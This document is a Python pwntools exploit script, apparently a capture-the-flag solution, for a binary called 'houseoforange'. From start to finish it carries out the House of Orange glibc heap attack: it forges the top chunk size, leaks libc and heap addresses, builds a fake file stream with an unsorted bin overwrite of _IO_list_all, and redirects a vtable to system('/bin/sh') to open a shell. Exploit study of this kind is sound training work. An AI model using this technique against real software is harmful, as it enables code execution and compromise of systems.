from pwn import *

# Author : Angelboy
# http://blog.angelboy.tw

host = "52.68.192.99"
port = 56746

# r = remote(host,port)
r = process('./houseoforange')

def build(size,name,price,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))


def see():
    r.recvuntil(":")
    r.sendline("2")
    data = r.recvuntil("+++++++++++++++++++++++++++++++++++++")
    return data

def upgrade(size,name,price,color):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))


build(0x80,"ddaa",199,2)
payload = b"a"*0x90
payload += p32(0xdada) + p32(0x20) + p64(0)
payload += p64(0) + p64(0xf31) # forge top size

upgrade(0xb1,payload,123,3) # overwrite the size of top
build(0x1000,"qqqqq",199,1) # trigger the _int_free in sysmalloc
build(0x400,"aaaaaaa",199,2) # create a large chunk and Leak the address of libc

data = see().split(b"Price")[0].split()[-1].ljust(8,b"\x00")
libcptr =  u64(data)
libc = libcptr - 0x3c4188
print("libc:",hex(libc))

upgrade(0x400,"c"*16,245,1) # Leak the address of heap
data = (b"\x00" +see().split(b"Price")[0].split()[-1]).ljust(8,b"\x00")
heapptr = u64(data)
heap = heapptr - 0x100
print("heap:",hex(heap))

io_list_all = libc + 0x3c4520
system = libc + 0x45380
vtable_addr = heap + 0x728-0xd0

payload = b"b"*0x410
payload += p32(0xdada) + p32(0x20) + p64(0)
stream = b"/bin/sh\x00" + p64(0x61) # fake file stream
stream += p64(0xddaa) + p64(io_list_all-0x10) # Unsortbin attack
stream = stream.ljust(0xa0,b"\x00")
stream += p64(heap+0x700-0xd0)
stream = stream.ljust(0xc0,b"\x00")
stream += p64(1)
payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(system)
upgrade(0x800,payload,123,3)
r.recvuntil(":")
r.sendline("1") # trigger malloc and abort

r.interactive()
